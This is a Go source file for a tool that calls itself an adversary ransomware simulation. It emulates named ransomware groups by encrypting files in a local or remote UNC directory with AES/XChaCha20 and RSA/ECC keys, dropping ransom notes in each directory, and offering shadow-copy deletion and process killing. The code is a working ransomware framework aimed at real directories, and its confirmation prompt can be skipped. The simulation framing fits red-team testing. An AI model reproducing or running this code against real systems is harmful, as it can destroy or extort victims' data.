package main

// TODO - Process Terminations
// TODO - VSS Removals
// TODO - EDS Validation Mechanism
// TODO - Revisit ECC Encryption Implementation as it's actually using AES right now and ECC keys are basically an input to this
// TODO - Revisit file walking to completely skip dir exclusions - right now it will still grab subdirs even if parent is skipped
// TODO - Desktop Background Optional Capability
// TODO - Icon Association Optional Capability
// TODO - Remote Hostname Parsing

import (
	"embed"
	"errors"
	"flag"
	"fmt"
	"github.com/abakum/embed-encrypt/encryptedfs"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"sync"
)

// go run github.com/abakum/embed-encrypt - When config updates, use this to regenerate necessary data.

//encrypted:embed config.yaml
var configFile encryptedfs.FS

// Keys will be stored by default in embedded file system
//
//go:embed *.pub
var publicKeys embed.FS
var eccKeyName = "ecc_key.ecc.pub"
var rsaKeyName = "rsa_key.rsa.pub"

var dummy_extensions = []string{"docx", "docm", "xlsm", "xlsx", "qbw", "rar", "csv", "sln", "bin", "zip", "pdf", "txt"}
var subdir_names = []string{"finance", "reports", "documents", "it", "exhibits", "backup"}
var file_names = []string{"workbook", "report", "export", "timesheet", "evidence", "knowledge", "system", "adjustment", "observable", "genuine", "certificates", "judgement", "corporate", "domain", "tempest", "research", "hypothesis", "parallel"}
var subFileNames = []string{"base", "employee", "confidential", "sensitive", "markings", "delimited", "full", "temporary", "interim", "remarkable", "explicit", "absolute", "aws", "directreport", "hr", "it", "fin", "monthly", "quarterly", "daily"}

func parseArgs(groups []RansomActor) (map[string]any, error) {
	// Target Options
	targetDirectory := flag.String("directory", "", "Target Directory - can be UNC Path (\\\\localhost\\C$\\test) or Local (C:\\test)")
	method := flag.String("method", "inline", "inline - Read File, Encrypt in Memory, Write Modifications to Disk; outline - Read File, Encrypt to New File, Delete Original")
	recursive := flag.Bool("recursive", false, "Whether or not to encrypt all subdirs recursively or not")
	group := flag.String("group", "", "Specify a group to emulate - if none selected, will select one at random")
	list := flag.Bool("list", false, "List available groups to emulate")
	skip := flag.Bool("skipconfirm", false, "Skip Directory Confirmation Prompt (be careful!)")

	// Encryption/Decryption Parameters - will override group settings if used for encryption/decryption
	decrypt := flag.Bool("decrypt", false, "Attempt to decrypt using specified options - must include RSA Private Key and Group Name OR Cipher Used")
	sym_cipher := flag.String("cipher", "", "Specify Symmetric Cipher for Encryption/Decryption")
	encryption_percent := flag.Int("ep", 25, "Percentage of data to encrypt in each file over the 100%-auto threshold")
	threshold_auto_fullencrypt := flag.Int64("threshold", 1024, "File size in bytes to automatically encrypt 100% of the contents if file Size <= provided number")
	workers := flag.Int("workers", 25, "How many goroutines to use for encryption")

	// Offensive
	killprocs := flag.Bool("killprocs", false, "Attempt to stop configured list of process binaries on the target machine prior to encryption")
	vss := flag.Bool("vss", false, "Attempt to remove all VSS copies on the target host prior to encryption")

	// Asymmetric Keys
	generate_keys := flag.Bool("generate_keys", false, "If specified, will generate new RSA/ECC keys to use for encryption/decryption purposes")
	rsa_public := flag.String("rsa_public", "", "Specify RSA Public-Key File to use - if blank, will use embedded key")
	rsa_private := flag.String("rsa_private", "", "Specify RSA Private-Key File - must be specified with decrypt if asymmetric system is RSA")
	ecc_public := flag.String("ecc_public", "", "Specify ECC Public-Key File to use - if blank, will use embedded key")
	ecc_private := flag.String("ecc_private", "", "Specify ECC Private-Key File - must be specified with decrypt if asymmetric system is ECC")

	// Dummy Data Creation Parameters
	create := flag.Bool("create", false, "Create a mixture of dummy-data files in the target directory for encryption targeting - when using this, only files created by impact will be targeted for encryption, regardless of existence")
	create_count := flag.Int("create_files", 5000, "How many dummy-files to create")
	create_size := flag.Int("create_size", 5000, "Size in megabytes of dummy-file data to target - distributed evenly across create_files count")
	flag.Parse()

	// If we are not listing threat actor templates or ge
	if *targetDirectory == "" && !*list && !*generate_keys {
		return nil, errors.New("Empty Target Directory - must specify for encryption/decryption operations")
	}

	// Must use one or the other
	// inline refers to modifying a file and writing the encrypted portions back to the same file
	// outline refers to creating a new file and deleting the original
	if *method != "inline" && *method != "outline" {
		return nil, errors.New("Invalid Encryption Method - must be 'inline' or 'outline")
	}

	// validate group selection or pick random - if decrypting, this is a bad idea.
	selectedGroup := RansomActor{}
	if *group == "" {
		n := rand.Intn(len(groups))
		selectedGroup = groups[n]
	} else {
		match := false
		groupNames := ""
		for _, v := range groups {
			groupNames += fmt.Sprintf("%s | ", v.Group)
			if strings.ToLower(*group) == strings.ToLower(v.Group) {
				match = true
				selectedGroup = v
			}
		}
		if !match {
			return nil, errors.New(fmt.Sprintf("Invalid Group Name - must be one of the following: %s", groupNames))
		}
	}

	// User must specify the assymmetric cipher being used for decryption
	if *decrypt && *rsa_private == "" && *ecc_private == "" {
		return nil, errors.New(fmt.Sprintf("Must specify an RSA/ECC Private Key file when using -decrypt"))
	}

	// User must specify the symmetric cipher being used for decryption
	if *decrypt && *sym_cipher == "" && *group == "" {
		return nil, errors.New(fmt.Sprintf("Must specify group or cipher when using -decrypt"))
	}

	// User must specify what decryption mode we are using
	if *rsa_private != "" && *ecc_private != "" {
		return nil, errors.New("Cannot use rsa_private and ecc_private together - must choose only one for decryption")
	}

	// File Existence/Read Checks - if specified, we should be able to os stat them
	if *rsa_private != "" {
		err := doesOSEntryExist(*rsa_private)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified RSA Private Key File: %s", err.Error()))
		}
	}
	if *rsa_public != "" {
		err := doesOSEntryExist(*rsa_public)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified RSA Public Key File: %s", err.Error()))
		}
	}
	if *ecc_private != "" {
		err := doesOSEntryExist(*ecc_private)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified ECC Private Key File: %s", err.Error()))
		}
	}
	if *ecc_public != "" {
		err := doesOSEntryExist(*ecc_public)
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Error with specified ECC Public Key File: %s", err.Error()))
		}
	}

	if (*encryption_percent > 100 || *encryption_percent <= 0) && !*decrypt {
		return nil, errors.New("Encryption Percent must be >0 and <=100")
	}

	if *threshold_auto_fullencrypt <= 0 {
		return nil, errors.New("Threshold must be >0")
	}

	arguments := map[string]any{
		"target":                     *targetDirectory,
		"method":                     *method,
		"group":                      selectedGroup,
		"list":                       *list,
		"skip":                       *skip,
		"recursive":                  *recursive,
		"create":                     *create,
		"create_count":               *create_count,
		"create_size":                *create_size,
		"workers":                    *workers,
		"rsa_public":                 *rsa_public,
		"rsa_private":                *rsa_private,
		"ecc_public":                 *ecc_public,
		"ecc_private":                *ecc_private,
		"decrypt":                    *decrypt,
		"sym_cipher":                 *sym_cipher,
		"generate_keys":              *generate_keys,
		"killprocs":                  *killprocs, // TODO
		"vss":                        *vss,       // TODO
		"encryption_percent":         *encryption_percent,
		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt,
	}

	return arguments, nil
}

func main() {
	printFormattedMessage("impact - Adversary Ransomware Simulation", INFO)
	printFormattedMessage("For Questions or Issues: github.com/joeavanzato/impact", INFO)

	config, err := ReadConfig()
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}
	args, err := parseArgs(config.Groups)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	asymKeys := AsymKeyHandler{
		RSAPublicKey:      nil,
		RSAPublicKeyFile:  "",
		RSAPrivateKey:     nil,
		RSAPrivateKeyFile: "",
		ECCPublicKey:      nil,
		ECCPublicKeyFile:  "",
		ECCPrivateKey:     nil,
		ECCPrivateKeyFile: "",
		System:            "",
	}
	if args["generate_keys"].(bool) {
		asymKeys, err = generateKeys()
		if err != nil {
			printFormattedMessage(err.Error(), ERROR)
		}
		return
	}
	if args["rsa_private"].(string) != "" {
		asymKeys.RSAPrivateKeyFile = args["rsa_private"].(string)
	}
	if args["rsa_public"].(string) != "" {
		asymKeys.RSAPublicKeyFile = args["rsa_public"].(string)
	}
	if args["ecc_private"].(string) != "" {
		asymKeys.ECCPrivateKeyFile = args["ecc_private"].(string)
	}
	if args["ecc_public"].(string) != "" {
		asymKeys.ECCPublicKeyFile = args["ecc_public"].(string)
	}

	group := args["group"].(RansomActor)
	target_dir := args["target"].(string)
	if args["list"].(bool) {
		printFormattedMessage(fmt.Sprintf(""), INFO)
		printFormattedMessage("Ransomware Group Details", INFO)
		for _, v := range config.Groups {
			printFormattedMessage(fmt.Sprintf("############"), INFO)
			printFormattedMessage(fmt.Sprintf("Group: %s", v.Group), INFO)
			printFormattedMessage(fmt.Sprintf("Extensions: %s", strings.Join(v.Extensions, ", ")), INFO)
			noteNames := make([]string, 0)
			for _, j := range v.Notes {
				noteNames = append(noteNames, j)
			}
			printFormattedMessage(fmt.Sprintf("Note Names: %s", strings.Join(noteNames, ", ")), INFO)
			printFormattedMessage(fmt.Sprintf("Cipher: %s", v.Cipher), INFO)
		}
		return
	}

	// Check if local or remote target and get hostname if remote
	printFormattedMessage(fmt.Sprintf("Checking Target Directory: %s", target_dir), INFO)
	err = doesOSEntryExist(target_dir)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Target Directory Error: %s", err.Error()), INFO)
		return
	}
	isRemoteDevice := false
	if strings.HasPrefix(target_dir, "\\\\") {
		isRemoteDevice = true
	}

	// Delete VSS Copies on target
	if args["vss"].(bool) {
		err = RemoveShadowCopies(isRemoteDevice)
		if err != nil {
			// Non-fatal so we will continue
			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
		}
	}

	// Kill processes on target
	if args["killprocs"].(bool) {
		err = KillTargetProcesses(config.ProcessKillNames, isRemoteDevice, "")
		if err != nil {
			// Non-fatal so we will continue
			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
		}
	}
	return

	// Need to create files now if performing
	fileList := make([]string, 0)
	if args["create"].(bool) {
		err, fileList = CreateFiles(args["create_count"].(int), args["create_size"].(int), target_dir)
		if err != nil {
			printFormattedMessage(err.Error(), ERROR)
			return
		}
		printFormattedMessage(fmt.Sprintf("Created %d Files in Target Directory", len(fileList)), INFO)
	}

	// We have valid group, directory, method at this point - now we want to determine if we are creating a subdir/files to simulate with or not
	printFormattedMessage(fmt.Sprintf("Simulating Group: %s", group.Group), INFO)
	extension := group.Extensions[rand.Intn(len(group.Extensions))]
	extension = replaceExtensionVariables(extension)
	extensionMethod := group.ExtensionMethod
	validExtensionMethods := []string{"mutate", "append"}
	if !slices.Contains(validExtensionMethods, extensionMethod) {
		printFormattedMessage(fmt.Sprintf("Invalid Extension Method: %s", group.ExtensionMethod), ERROR)
		return
	}
	note := replaceExtensionVariables(group.Note)
	noteName := group.Notes[rand.Intn(len(group.Notes))]
	method := args["method"].(string)

	if !args["skip"].(bool) {
		var con string
		if args["decrypt"].(bool) {
			fmt.Print("impact is about to decrypt data in target directory %s - please type 'confirm' to proceed:")
		} else {
			fmt.Print("impact is about to encrypt data in target directory %s - please type 'confirm' to proceed:")
		}
		_, err := fmt.Scan(&con)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error scanning input: %s", err.Error()), ERROR)
			return
		}
		if con != "confirm" {
			printFormattedMessage(fmt.Sprintf("Abandoning Execution due to lack of confirmation: %s", con), ERROR)
			return
		}
	}
	decryptEnabled := args["decrypt"].(bool)

	// validate supplied cipher or group read
	sym_cipher := ""
	if args["sym_cipher"].(string) != "" {
		sym_cipher = strings.ToLower(args["sym_cipher"].(string))
	} else {
		sym_cipher = strings.ToLower(group.Cipher)
	}
	allowed_symmetric_ciphers := []string{"xchacha20", "aes256"}
	if !slices.Contains(allowed_symmetric_ciphers, sym_cipher) {
		printFormattedMessage(fmt.Sprintf("Symmetric Cipher not implemented: %s", sym_cipher), ERROR)
		return
	}

	asym_cipher := strings.ToLower(group.AsymCipher)
	allowed_asym_ciphers := []string{"rsa", "ecc"}
	if !slices.Contains(allowed_asym_ciphers, asym_cipher) {
		printFormattedMessage(fmt.Sprintf("Asymmetric Cipher not implemented: %s", asym_cipher), ERROR)
		return
	}
	// validate supplied asymmetric cipher or group read
	asymKeys, err = setupKeyData(asymKeys, decryptEnabled, asym_cipher)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	// Now we are ready to actually start encryption/decryption
	var ewg sync.WaitGroup
	fileTargetChannel := make(chan File)

	recursiveBool := args["recursive"].(bool)
	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool)

	// These are only necessary for encryption - not decryption
	config.ThresholdFullEncrypt = args["threshold_auto_fullencrypt"].(int64)
	config.EncryptionPercent = args["encryption_percent"].(int)

	// ewg is closed once all workers are finished encrypting, fileTargetChannel is closed once all files have been pushed to the channel
	for i := 0; i < args["workers"].(int); i++ {
		ewg.Add(1)
		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, asymKeys, decryptEnabled, group, config)
	}

	// Regex setup for file name-contains skips when doing encryption checks
	regexString := ""
	for i, v := range config.FileNameExclusions {
		if i == 0 {
			regexString = fmt.Sprintf(".*%s.*", strings.ToLower(v))
		} else {
			regexString = fmt.Sprintf("%s|.*%s.*", regexString, strings.ToLower(v))
		}
	}
	fileNameSkipRegex, err = regexp.Compile(regexString)
	if err != nil {
		printFormattedMessage(err.Error(), ERROR)
		return
	}

	findFileTargets(target_dir, note, noteName, recursiveBool, fileList, fileTargetChannel, args["decrypt"].(bool), &config)
	ewg.Wait()
}

func findFileTargets(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool, config *Config) {
	// Each unique directory that we encounter, including base, should receive a ransomware note creation
	// If len(fileList) == 0, we did NOT create files explicitly for this test and as such, will be flat-scanning or recursively iterating
	// Flat scanning is easy - we can populate right now
	ransomwareNoteDirs := make([]string, 0)
	if !recursive && len(fileList) == 0 {
		// We have not created any files to encrypt and just want top-level
		fileList, _ = gatherFiles(fileList, recursive, targetDir)
	}
	if len(fileList) != 0 {
		// We have populated file-list - either from top-level or created files
		// We won't filter if it's non-recursive, just do all since we assume it's highly targeted for a reason
		for _, v := range fileList {
			baseDir := filepath.Dir(v)
			if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
				createNote(note, noteName, baseDir)
				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
			}
			i, err := os.Stat(v)
			if err != nil {
				continue
			}
			f := File{
				Path: v,
				Size: i.Size(),
			}
			c <- f
		}
	} else if recursive {
		filepath.Walk(targetDir,
			func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}

				// Only do filters if we are encrypting, not decrypting
				if !decrypt {
					if !shouldProcessFile(path, config) {
						return nil
					}
				}

				//fmt.Println(filepath.Ext(path))
				baseDir := filepath.Dir(path)
				if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
					createNote(note, noteName, baseDir)
					ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
				}
				f := File{
					Path: path,
					Size: info.Size(),
				}
				c <- f
				return nil
			})
	}
	close(c)
}
